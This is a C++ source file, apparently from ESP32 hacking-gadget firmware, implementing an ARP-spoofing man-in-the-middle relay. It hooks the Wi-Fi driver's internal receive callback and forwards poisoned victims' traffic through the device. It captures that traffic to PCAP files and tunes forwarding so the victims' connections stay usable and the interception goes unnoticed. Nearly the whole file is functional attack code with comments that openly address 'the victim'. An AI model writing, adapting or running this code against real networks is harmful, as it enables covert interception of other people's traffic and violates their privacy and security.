#include "utils/network/MitmRelay.h"

#include <WiFi.h>
#include <esp_heap_caps.h>

// Not shipped as headers by the Arduino framework, but exported from
// libnet80211.a / libpp.a (verified with nm).
extern "C" {
  typedef esp_err_t (*unigeek_wifi_rxcb_t)(void* buffer, uint16_t len, void* eb);
  esp_err_t esp_wifi_internal_reg_rxcb(wifi_interface_t ifx, unigeek_wifi_rxcb_t fn);
  esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, void* buffer, uint16_t len);
  void      esp_wifi_internal_free_rx_buffer(void* buffer);
}

// ── Static definitions ──────────────────────────────────────────────────────

uint8_t*             MitmRelay::_ringData  = nullptr;
MitmRelay::SlotMeta* MitmRelay::_ringMeta  = nullptr;
int                  MitmRelay::_slotCount = 0;
volatile int         MitmRelay::_head      = 0;
volatile int         MitmRelay::_tail      = 0;

MitmRelay*     MitmRelay::_self   = nullptr;
volatile bool  MitmRelay::_active = false;
esp_netif_t*   MitmRelay::_netif  = nullptr;

uint8_t  MitmRelay::_selfMac[6] = {};
uint32_t MitmRelay::_selfIp     = 0;
uint32_t MitmRelay::_baseEpoch  = 0;
uint32_t MitmRelay::_baseMs     = 0;

volatile uint32_t MitmRelay::_seen       = 0;
volatile uint32_t MitmRelay::_captured   = 0;
volatile uint32_t MitmRelay::_dropped    = 0;
volatile uint32_t MitmRelay::_forwarded  = 0;
volatile uint32_t MitmRelay::_txFailed    = 0;
volatile uint32_t MitmRelay::_loopDropped = 0;

ArpSpoofer*    MitmRelay::_arpS       = nullptr;
volatile bool  MitmRelay::_forwardS   = true;
volatile bool  MitmRelay::_captureS   = false;
MitmRelay::CaptureFilter MitmRelay::_captureFilter = nullptr;
char           MitmRelay::_errBuf[48] = {};

// ── Ring ────────────────────────────────────────────────────────────────────

bool MitmRelay::_allocRing() {
  _freeRing();

  // Internal RAM is the hard constraint on boards without PSRAM (the Cardputer
  // ADV among them): with WiFi and the async web server up there is rarely more
  // than ~100 KB of contiguous heap left. Taking most of it does not fail here —
  // it makes the *next* allocation fail, which shows up as an unrelated crash
  // while rendering. So only reach for a deep ring when it can live in PSRAM,
  // and always leave a working margin behind.
  // The margin only has to cover what rendering and the WiFi stack allocate
  // while we hold the ring — a ListScreen row sprite is ~9 KB, log rows are
  // smaller. 24 KB is comfortable; more than that and a no-PSRAM board can
  // never satisfy the request at all.
  const bool hasPsram = psramFound();
  const int  wanted[] = { hasPsram ? 64 : 8, 4, 2 };
  static constexpr size_t kHeapMargin = 24 * 1024;

  for (int i = 0; i < 3; i++) {
    const int    n    = wanted[i];
    const size_t need = (size_t)n * SNAP_LEN;

    uint8_t* d = nullptr;
    if (hasPsram) {
      d = (uint8_t*)heap_caps_malloc(need, MALLOC_CAP_8BIT | MALLOC_CAP_SPIRAM);
    }
    if (!d) {
      if (heap_caps_get_free_size(MALLOC_CAP_8BIT) < need + kHeapMargin) continue;
      d = (uint8_t*)heap_caps_malloc(need, MALLOC_CAP_8BIT);
    }
    if (!d) continue;

    SlotMeta* m = (SlotMeta*)heap_caps_malloc((size_t)n * sizeof(SlotMeta), MALLOC_CAP_8BIT);
    if (!m) { heap_caps_free(d); continue; }

    _ringData  = d;
    _ringMeta  = m;
    _slotCount = n;
    return true;
  }

  snprintf(_errBuf, sizeof(_errBuf), "No RAM for ring (%u KB free)",
           (unsigned)(heap_caps_get_free_size(MALLOC_CAP_8BIT) / 1024));
  _error = _errBuf;
  return false;
}

void MitmRelay::_freeRing() {
  if (_ringData) { heap_caps_free(_ringData); _ringData = nullptr; }
  if (_ringMeta) { heap_caps_free(_ringMeta); _ringMeta = nullptr; }
  _slotCount = 0;
  _head      = 0;
  _tail      = 0;
}

void MitmRelay::_enqueue(const uint8_t* data, uint16_t len) {
  if (!_ringData || _slotCount == 0) return;

  const int next = (_head + 1) % _slotCount;
  if (next == _tail) { _dropped++; return; }

  const uint16_t origLen = len;
  if (len > SNAP_LEN) len = SNAP_LEN;

  memcpy(_ringData + (size_t)_head * SNAP_LEN, data, len);

  const uint32_t ms = millis() - _baseMs;
  SlotMeta& m = _ringMeta[_head];
  m.len     = len;
  m.origLen = origLen;
  m.tsSec   = _baseEpoch + ms / 1000;
  m.tsUsec  = (ms % 1000) * 1000;

  _head = next;
  _captured++;
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

bool MitmRelay::begin(Mode mode) {
  end();

  _error = nullptr;
  if (WiFi.status() != WL_CONNECTED) { _error = "Not connected"; return false; }

  // The ring exists only to stage frames on their way to the PCAP file. With no
  // writer attached — ARP spoofing without capture — there is nothing to stage,
  // and on a board without PSRAM the allocation is exactly what would fail.
  _captureS = (_pcap != nullptr);
  if (_captureS && !_allocRing()) return false;   // _allocRing sets _error

  _mode = mode;
  _self = this;

  WiFi.macAddress(_selfMac);
  _selfIp = (uint32_t)WiFi.localIP();

  _baseEpoch = _pcap ? _pcap->baseEpoch() : 0;
  _baseMs    = _pcap ? _pcap->baseMs()    : millis();

  _captured = _dropped = _forwarded = _txFailed = 0;
  _loopDropped = 0;
  _seen        = 0;
  _lastHook    = millis();
  _storageFailed = false;
  _lastFlush     = millis();

  _arpS     = _arp;
  _forwardS = _forward;

  // Arduino leaves the station in WIFI_PS_MIN_MODEM. For an ordinary client
  // that is free battery; for a relay it is the attack. The radio sleeps
  // between beacons and the AP queues everything addressed to us, so the
  // victim's traffic arrives late and in bursts and our forwards sit waiting
  // for a wake slot — the connection works for a few seconds and then stalls.
  // Forwarding cannot be duty-cycled: we are a router now, not a client.
  WiFi.setSleep(false);

  if (_mode == MODE_RELAY) {
    _netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!_netif) { _error = "No STA netif"; WiFi.setSleep(true); _freeRing(); return false; }

    // From here on every inbound frame goes through _rxCb. It must hand
    // anything it does not consume to esp_netif_receive() or the device loses
    // its own connectivity — including the portal web server.
    if (esp_wifi_internal_reg_rxcb(WIFI_IF_STA, &MitmRelay::_rxCb) != ESP_OK) {
      _error = "RX hook rejected";
      WiFi.setSleep(true);
      _freeRing();
      return false;
    }
  } else {
    wifi_promiscuous_filter_t pf = {};
    pf.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&pf);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&MitmRelay::_promiscuousCb);
  }

  _active  = true;
  _running = true;
  return true;
}

void MitmRelay::end() {
  if (!_running) { _active = false; return; }

  // Stop consuming first. The hook itself stays registered: esp_netif installs
  // its handler through a static function we cannot get a pointer to, so the
  // only safe "uninstall" is to degrade _rxCb into a pure passthrough.
  _active  = false;
  _forwardS = false;

  if (_mode == MODE_MONITOR) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
  }

  // Let any callback already running on the WiFi task finish before the ring
  // it writes into is released.
  delay(20);

  update();               // drain whatever is still queued
  if (_pcap) _pcap->flush();

  _freeRing();
  _arpS     = nullptr;
  _self     = nullptr;
  _captureS = false;
  _running  = false;

  // Back to the Arduino default now that we are a plain client again.
  WiFi.setSleep(true);
}

void MitmRelay::update() {
  // Re-arm the RX hook. esp_wifi_internal_reg_rxcb() is a single slot that
  // esp_netif owns in normal operation, and anything that re-attaches the
  // station interface — a reconnect, a DHCP renewal, an internal driver
  // reconfiguration — puts esp_netif's own callback back into it. Nothing
  // reports that. The relay simply stops seeing frames: the poison still holds,
  // the victim still sends everything to our MAC, and every packet goes into
  // the device's own stack and dies there. Forwarding falls to a trickle while
  // the ARP counters keep climbing, which is exactly the shape of the failure
  // we chased twice. Re-registering is idempotent and costs one call.
  if (_running && _active && _mode == MODE_RELAY) {
    const unsigned long t = millis();
    if (t - _lastHook > 2000) {
      _lastHook = t;
      esp_wifi_internal_reg_rxcb(WIFI_IF_STA, &MitmRelay::_rxCb);
    }
  }

  while (_tail != _head) {
    if (_slotCount == 0) break;
    const SlotMeta m    = _ringMeta[_tail];
    const uint8_t* data = _ringData + (size_t)_tail * SNAP_LEN;

    if (_pcap && _pcap->ok()) {
      if (!_pcap->writeFrame(data, m.len, m.origLen, m.tsSec, m.tsUsec)) {
        _storageFailed = true;
      }
    }
    _tail = (_tail + 1) % _slotCount;
  }

  const unsigned long now = millis();
  if (_pcap && _pcap->ok() && now - _lastFlush > 1000) {
    if (!_pcap->flush()) _storageFailed = true;
    _lastFlush = now;
  }
}

// ── 802.11 monitor fallback ─────────────────────────────────────────────────

void MitmRelay::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!_active || !_captureS) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  const auto*    pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  uint16_t       len = (uint16_t)pkt->rx_ctrl.sig_len;
  if (len < 10) return;

  // The driver still counts the 4-byte FCS on management frames; strip it so
  // Wireshark does not show four junk bytes on every beacon.
  if (type == WIFI_PKT_MGMT && len > 4) len -= 4;

  _enqueue(pay, len);
}

// ── Relay RX hook (runs in the WiFi task) ───────────────────────────────────

esp_err_t MitmRelay::_rxCb(void* buffer, uint16_t len, void* eb) {
  uint8_t* eth = (uint8_t*)buffer;

  // Degraded to passthrough after end() — keep the stack fed and do nothing else.
  if (!_active || !eth || len < 14) {
    return esp_netif_receive(_netif, buffer, len, eb);
  }

  // Every frame the hook is handed, before any triage. This is the number that
  // separates "we are not receiving the victim's traffic" from "we receive it
  // and fail to relay it" — two failures that look identical from the victim.
  _seen++;

  const uint8_t* dst        = eth;
  const uint8_t* src        = eth + 6;
  const uint16_t etherType  = ((uint16_t)eth[12] << 8) | eth[13];
  const bool     toUs       = (memcmp(dst, _selfMac, 6) == 0);
  const bool     groupAddr  = (dst[0] & 0x01) != 0;
  const bool     fromUs     = (memcmp(src, _selfMac, 6) == 0);

  // Learn the network from every ARP that goes by, including the replies to
  // our own discovery sweep.
  if (etherType == 0x0806 && _arpS) {
    _arpS->observe(eth, len);

    // Our own broadcast poison comes straight back to us: the AP relays every
    // broadcast to all associated stations, ourselves included. Handing it to
    // esp_netif_receive() below would let lwIP believe its own gateway lives at
    // our MAC, and the device's own traffic then loops out to the AP and back.
    // Swallow anything whose ARP sender hardware address is ours.
    if (len >= 42 && memcmp(eth + 22, _selfMac, 6) == 0) {
      esp_wifi_internal_free_rx_buffer(eb);
      return ESP_OK;
    }
  }

  // Learn local hosts from their own traffic. The broadcast poison pulls in
  // devices the sweep never saw, and this is how they get into the table so the
  // gateway side can be poisoned for them too.
  if (etherType == 0x0800 && len >= 14 + 20 && _arpS) {
    uint32_t srcIp;
    memcpy(&srcIp, eth + 14 + 12, 4);
    _arpS->observeIpv4(src, srcIp);
  }

  if (_captureS && (!_captureFilter || _captureFilter(eth, len))) _enqueue(eth, len);

  // Only unicast transit IPv4 is a forwarding candidate. Forwarding broadcast
  // would loop it straight back onto the same link.
  if (_forwardS && _active && toUs && !groupAddr && !fromUs &&
      etherType == 0x0800 && len >= 14 + 20) {

    const uint8_t* ip = eth + 14;
    uint32_t dstIp;
    memcpy(&dstIp, ip + 16, 4);

    if (dstIp != _selfIp) {
      const uint8_t* nextHop = nullptr;
      if (_arpS) {
        const ArpSpoofer::Target* t = _arpS->findByIp(dstIp);
        if (_arpS->gatewayKnown() && dstIp == _arpS->gatewayIp()) {
          // Addressed to the router itself, not through it. This has to be
          // checked before the local-host branch below, because the gateway is
          // held in _gwMac and deliberately never enters the target table, so a
          // lookup miss plus "is local" would black-hole it. That path was
          // eating every DNS query in the common setup where the router is also
          // the resolver, which killed the victim's name resolution outright.
          // Delivering to the real gateway MAC cannot loop: the router consumes
          // the frame at L3.
          nextHop = _arpS->gatewayMac();
        } else if (t) {
          nextHop = t->mac;                       // known victim: deliver directly
        } else if (_arpS->isLocal(dstIp)) {
          // A local host we have not identified. Handing it to the gateway is a
          // trap: the gateway's ARP entry for that host is poisoned to our MAC,
          // so the frame comes straight back and ping-pongs until the radio
          // saturates — which takes the victim's whole connection down with it.
          // Dropping costs one packet; looping costs the network. Ask who owns
          // the address so the next packet of the same flow can be delivered
          // instead of dropped too.
          _loopDropped++;
          _arpS->requestResolve(dstIp);
          esp_wifi_internal_free_rx_buffer(eb);
          return ESP_OK;
        } else if (_arpS->gatewayKnown()) {
          nextHop = _arpS->gatewayMac();          // off-subnet: out via the gateway
        }
      }

      if (nextHop) {
        memcpy(eth + 0, nextHop, 6);
        memcpy(eth + 6, _selfMac, 6);
        // The driver refuses the frame when its TX buffers are exhausted, which
        // is the realistic failure under load. Count it — a silently dropped
        // forward is indistinguishable from traffic that never arrived, and it
        // is what makes a victim's connection "slow" rather than dead.
        if (esp_wifi_internal_tx(WIFI_IF_STA, eth, len) == ESP_OK) _forwarded++;
        else                                                       _txFailed++;
        esp_wifi_internal_free_rx_buffer(eb);
        return ESP_OK;
      }
    }
  }

  return esp_netif_receive(_netif, buffer, len, eb);
}
